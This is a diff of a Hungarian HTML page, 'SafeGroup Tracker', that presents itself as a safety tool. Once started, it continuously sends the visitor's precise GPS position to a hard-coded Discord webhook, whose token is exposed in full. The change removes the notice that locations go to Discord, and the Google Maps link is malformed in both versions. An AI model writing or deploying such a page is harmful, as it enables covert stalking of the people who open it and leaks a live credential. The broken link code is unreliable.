@@ -3,89 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafeGroup Tracker 2026</title>
+    <title>SafeGroup Tracker</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #23272a; color: white; padding: 20px; }
-        .container { background: #2c2f33; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.3); max-width: 400px; margin: auto; }
-        .btn { background: #5865f2; border: none; padding: 15px 30px; color: white; font-weight: bold; border-radius: 10px; cursor: pointer; font-size: 18px; transition: 0.3s; margin-top: 20px; }
-        .btn:hover { background: #4752c4; transform: scale(1.05); }
-        #status { margin-top: 20px; color: #b9bbbe; font-style: italic; font-size: 14px; }
-        .info { font-size: 12px; color: #f04747; margin-top: 10px; }
+        body { font-family: sans-serif; text-align: center; background: #23272a; color: white; padding: 50px; }
+        .btn { background: #5865F2; border: none; padding: 20px; color: white; border-radius: 10px; cursor: pointer; font-size: 18px; }
+        #status { margin-top: 20px; color: #b9bbbe; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🛡️ SafeGroup</h1>
-        <p>Folyamatos biztonsági követés</p>
-        
-        <button class="btn" onclick="startAutoTracking()">KÖVETÉS INDÍTÁSA</button>
-        
-        <div id="status">Várakozás az indításra...</div>
-        <p class="info">Figyelem: A képernyőt ne zárd le a pontos követéshez!</p>
-    </div>
+    <h1>🛡️ SafeGroup Biztonság</h1>
+    <button class="btn" onclick="startTracking()">KÖVETÉS INDÍTÁSA</button>
+    <p id="status">Várakozás...</p>
 
     <script>
-        // FONTOS: IDE MÁSOLD A WEBHOOK URL-EDET!
+        // IDE MÁSOLD A WEBHOOK URL-T!
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462078788853698712/9m8atZ32hIGG_KKFyKsr_7ZKslgPMtPDzLC5ZrZhuyj-Dybh3ZJb_-yi45Z9VebGrCDD";
-        
-        let userName = prompt("Add meg a neved:", "Barát");
-        if(!userName) userName = "Ismeretlen";
 
-        function startAutoTracking() {
-            if (navigator.geolocation) {
-                // watchPosition: Folyamatosan figyel és küld, ha elmozdul a telefon
-                navigator.geolocation.watchPosition(updateLocation, handleError, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 20000
-                });
-                document.getElementById("status").innerHTML = "🔴 <b>Követés aktív...</b><br>Adatok küldése a Discordra.";
-            } else {
-                alert("Hiba: A böngésződ nem támogatja a GPS-t!");
+        function startTracking() {
+            if (!navigator.geolocation) {
+                alert("A böngésző nem támogatja a GPS-t!");
+                return;
             }
+            document.getElementById("status").textContent = "GPS keresése...";
+            
+            // Folyamatos követés
+            navigator.geolocation.watchPosition(sendToDiscord, handleError, {
+                enableHighAccuracy: true
+            });
         }
 
-        function updateLocation(position) {
+        function sendToDiscord(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const accuracy = Math.round(position.coords.accuracy);
+            
+            // Tiszta link létrehozása
+            const googleLink = "https://www.google.com" + lat + "," + lon;
 
-            // Google Maps link pontos formátuma
-            const googleLink = `https://www.google.com{lat},${lon}`;
-
-            // Discord üzenet összeállítása
             const payload = {
-                embeds: [{
-                    title: `📍 ${userName} mozgásban van`,
-                    description: `**Google Maps:** [Megnyitás térképen](${googleLink})\n**Pontosság:** ${accuracy} méter`,
-                    color: 5763719, // Zöld szín
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "SafeGroup v2026 - Automatikus frissítés" }
-                }]
+                content: "📍 **Friss helyzetérkezés:**\n" + googleLink
             };
 
-            // Küldés a Discordra (mode: 'no-cors' a mobil stabilitásért)
             fetch(DISCORD_WEBHOOK, {
                 method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                mode: 'no-cors', 
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
-            }).then(() => {
-                console.log("Sikeres küldés: " + lat + "," + lon);
-                document.getElementById("status").innerHTML = "🔴 <b>Követés aktív...</b><br>Utolsó frissítés: " + new Date().toLocaleTimeString();
-            }).catch(err => {
-                console.error("Discord hiba: ", err);
+            })
+            .then(() => {
+                document.getElementById("status").textContent = "✅ Siker! Utolsó küldés: " + new Date().toLocaleTimeString();
+            })
+            .catch(err => {
+                console.error(err);
+                document.getElementById("status").textContent = "❌ Küldési hiba történt.";
             });
         }
 
         function handleError(err) {
-            let msg = "GPS hiba: ";
-            if (err.code === 1) msg += "Nincs engedély (kapcsold be a GPS-t a böngészőben!)";
-            else if (err.code === 2) msg += "Nincs térerő / GPS jel.";
-            else if (err.code === 3) msg += "Időtúllépés.";
-            
-            document.getElementById("status").textContent = msg;
-            console.warn(msg, err);
+            document.getElementById("status").textContent = "❌ GPS hiba: " + err.message;
         }
     </script>
 </body>
